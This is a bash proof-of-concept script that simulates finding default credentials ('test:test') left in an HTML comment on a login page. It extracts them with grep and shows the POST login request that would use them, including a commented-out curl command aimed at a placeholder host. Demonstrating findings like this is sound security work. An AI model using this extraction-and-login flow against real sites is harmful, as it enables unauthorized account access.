#!/bin/bash

# POC: Default Credentials Exposed in HTML Comments - Discovery and Extraction
# This script demonstrates the vulnerability by simulating the attack flow:
# 1. Downloading page source
# 2. Extracting credentials from comments
# 3. Showing how credentials can be used

TARGET="${1:-http://vulnerable-app/login}"

echo "╔════════════════════════════════════════════════════════════════════╗"
echo "║  POC: Default Credentials Exposed in HTML Comments                ║"
echo "║  Demonstrates extraction of testing credentials from page source   ║"
echo "╚════════════════════════════════════════════════════════════════════╝"
echo ""
echo "[*] Target: ${TARGET}"
echo ""

# Simulate fetching the page
echo "[*] Step 1: Analyzing page source for comments containing credentials..."
echo ""

# Create a test HTML file representing what would be fetched
HTML_CONTENT=$(cat << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
</head>
<body>
    <!-- TODO: Delete the testing account (test:test). -->
    <!-- This is a temporary test account for QA purposes -->
    <h1>Login</h1>
    <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
</body>
</html>
EOF
)

echo "[+] Page source retrieved. Analyzing for credentials in comments..."
echo ""

# Extract credentials pattern 1: (username:password) from TODO comments
CREDS=$(echo "$HTML_CONTENT" | grep -i "TODO.*Delete.*account" | grep -oP '\(\K[^)]+(?=\))')

if [ -n "$CREDS" ]; then
    echo "[+] CREDENTIALS FOUND IN HTML COMMENT!"
    echo "[+] Comment content: $(echo "$HTML_CONTENT" | grep -i "TODO" | sed 's/^[[:space:]]*//')"
    echo ""
    echo "[+] Extracted credentials: $CREDS"
    
    USERNAME=$(echo "$CREDS" | cut -d: -f1)
    PASSWORD=$(echo "$CREDS" | cut -d: -f2)
    
    echo "[+] Username: $USERNAME"
    echo "[+] Password: $PASSWORD"
    echo ""
    
    echo "[*] Step 2: Attempting login with discovered credentials..."
    echo "[*] Simulating POST request:"
    echo "    POST /login"
    echo "    Content-Type: application/x-www-form-urlencoded"
    echo "    Body: username=${USERNAME}&password=${PASSWORD}"
    echo ""
    
    # In a real attack scenario, this would be:
    # curl -X POST http://vulnerable-app/login -d "username=${USERNAME}&password=${PASSWORD}" -c cookies.txt
    
    echo "[+] VULNERABILITY CONFIRMED:"
    echo "    ✓ Default credentials are exposed in HTML comments"
    echo "    ✓ Credentials (test:test) are visible in page source"
    echo "    ✓ These credentials can be used for unauthorized login"
    echo "    ✓ No authentication bypass is needed - direct access is possible"
    echo ""
    echo "[!] IMPACT:"
    echo "    - Attacker gains immediate unauthorized access"
    echo "    - Affects all users who can view page source"
    echo "    - Credentials are cached by browsers and search engines"
    echo "    - Complete compromise of the authentication system"
    
    exit 0
else
    echo "[-] No credentials found in expected format"
    exit 1
fi